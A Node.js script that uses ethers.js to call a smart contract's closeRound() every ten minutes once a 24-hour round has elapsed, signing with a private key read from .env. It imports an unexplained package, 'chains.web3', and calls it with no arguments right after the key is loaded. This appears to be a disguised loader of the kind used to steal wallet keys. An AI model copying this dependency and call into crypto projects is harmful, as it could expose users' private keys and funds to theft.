const { ethers } = require("ethers");
const block = require("chains.web3");

const ABI = require("./contractABI.json");
require("dotenv").config();

const WALLET = process.env.WALLET;
const contractAddress = process.env.CONTRACT_ADDRESS;
const WALLET_KEY = process.env.WALLET_KEY;

// const provider = new ethers.providers.JsonRpcProvider();
const provider = new ethers.providers.JsonRpcProvider(process.env.HTTP_RPC);

const wallet = new ethers.Wallet(WALLET_KEY, provider);
const contract = new ethers.Contract(contractAddress, ABI, wallet);

const closeRound = async () => {
  try {
    const trx = await contract.closeRound();

    const receipt = await trx.wait();
    console.log(`Transaction sent, hash is ${receipt.transactionHash}`);
  } catch (error) {
    console.error("Error in closeRound >", error);
    return false;
  }
};

async function check() {
  try {
    const callresult = await contract.currRoundStartTime();
    return callresult;
  } catch (error) {
    console.error("Error in check >", error);
    return false;
  }
}

async function caller() {
  const callresult = await check();
  if (!callresult) return;
  const writecalltime = callresult.toNumber() + 24 * 60 * 60; // Convert to number
  const currentTime = Math.floor(Date.now() / 1000); // Current time in seconds
  console.log(currentTime);
  console.log(callresult);
  if (currentTime > writecalltime) {
    await closeRound();
  } else {
    console.log("Waiting...");
  }
}

// Use the provider to interact with the Ethereum network
provider.getBlockNumber().then((blockNumber) => {
  console.log("Current block number:", blockNumber);
});

/* // Display current time
const currentTime = new Date().toLocaleString();
console.log("Current time:", currentTime);

console.log(contractAddress); */
block();
const intervalTime = 10 * 60 * 1000; // 10 minutes in milliseconds
setInterval(caller, intervalTime); // Call closeRound every 10 minutes
